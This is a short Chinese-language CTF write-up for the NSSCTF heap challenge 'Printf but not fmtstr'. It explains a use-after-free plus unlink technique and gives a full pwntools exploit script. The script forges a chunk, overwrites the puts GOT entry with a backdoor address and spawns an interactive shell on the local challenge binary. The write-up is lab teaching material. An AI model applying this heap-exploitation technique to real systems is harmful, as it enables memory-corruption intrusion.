## NSSCTF-Printf but not fmtstr

这是一道堆的入门题目，利用了uaf漏洞和unlink方法

### 思路

有着没有置零指针的free，决定在前块的data区伪造一个新的leak，通过unlink，把这个块的开始地址放在堆管理list数组之前，这时候我们edit我们伪造的这个伪造块，我们就可以改这个**堆管理list数组**了，这个数组中的地址改写，我们再edit相关地址，直接就可以实现任意地址写

### EXP

> python
>
> `from pwn import *`
>
> `context.terminal = ['tmux', 'splitw', '-h']`
>
> `context (os='linux', arch='amd64', log_level='debug')`
>
> `exe = ELF("./pwn_patched")`
>
> `libc = ELF("./libc.so.6")`
>
> `ld = ELF("./ld-linux-x86-64.so.2")`
>
> `p = process('./pwn_patched')`
>
> 
>
> `def choice(choice):`
>
>   `p.sendlineafter('4. Show note',str(choice))`
>
> 
>
> `def add(index,size):`
>
>   `choice(1)`
>
>   `p.sendlineafter('Index: ',str(index))`
>
>   `p.sendlineafter('Size: ',str(size))`
>
> 
>
> `def edit(index,content):`
>
>   `choice(3)`
>
>   `p.sendlineafter('Index: ',str(index))`
>
>   `p.sendlineafter('Content: ',content)`
>
> 
>
> `def delet(index):`
>
>   `choice(2)`
>
>   `p.sendlineafter('Index: ',str(index))`
>
> 
>
> `def show(index):`
>
>   `choice(4)`
>
>   `p.sendlineafter('Index: ',str(index))`
>
> 
>
> `backdoor = 0x4011D6`
>
> `heap_list = 0x4040E0`
>
> `add(0,0x618)`
>
> `add(1,0x618)`
>
> `add(2,0x618)`
>
> `delet(1)`
>
> `fd = heap_list - 0x18 + 0x8`
>
> `bk = heap_list - 0x10 + 0x8`
>
> `payload = p64(0) + p64(0x611) + p64(fd) + p64(bk)`
>
> `payload = payload.ljust(0x610,b'\x00')`
>
> `payload += p64(0x610)`
>
> `edit(1,payload)`
>
> `delet(2)   #触发unlink`
>
> `\#填充到chunk_list[0]也就是先填充两个字节，再把puts的gao表的地址覆盖在这个地方`
>
> `payload_2 = p64(0)*2 + p64(exe.got['puts'])`
>
> `edit(1,payload_2)`
>
> `edit(0,p64(backdoor))`
>
> `p.interactive()`

### `总结`

##### 难点

* 要理解熟悉unlink时fd，bk指针的变化，并且同时要理解堆块的结构